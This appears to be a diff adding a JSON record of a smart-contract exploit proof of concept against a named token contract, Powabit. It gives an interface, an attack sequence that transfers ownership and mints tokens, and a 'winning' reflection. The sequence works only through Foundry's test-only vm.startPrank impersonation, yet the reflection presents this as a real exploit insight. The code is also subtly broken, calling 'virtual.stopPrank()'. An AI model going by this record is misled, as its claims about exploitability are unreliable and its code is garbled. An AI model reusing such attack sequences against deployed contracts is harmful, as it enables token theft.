@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The target contract, Powabit (0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE), features a mint function restricted to the owner. The vulnerability is the ability to arbitrarily mint tokens once ownership is achieved. The PoC leverages a testing environment cheat code to impersonate the legitimate owner, transfer ownership to the attacker, and then call the mint function.",
+  "interface_arsenal": "interface IPowabitToken {\n    function owner() external view returns (address);\n    function transferOwnership(address newOwner) external;\n    function mint(uint256 amount) external returns (bool);\n}",
+  "attack_sequence": "// 1. Impersonate original owner\nvm.startPrank(originalOwner);\n\n// 2. Transfer ownership to attacker\ntoken.transferOwnership(attacker);\nvirtual.stopPrank();\n\n// 3. As new owner, mint tokens\ntoken.mint(mintAmount);",
+  "winning_reflection": "The key insight was recognizing that the mint function's only protection was the `onlyOwner` modifier. By using a simulation tool like Foundry's `vm.startPrank` to impersonate the current owner, ownership could be transferred. This made the attacker the new owner, granting them unrestricted access to the privileged `mint` function to create tokens at will."
+}
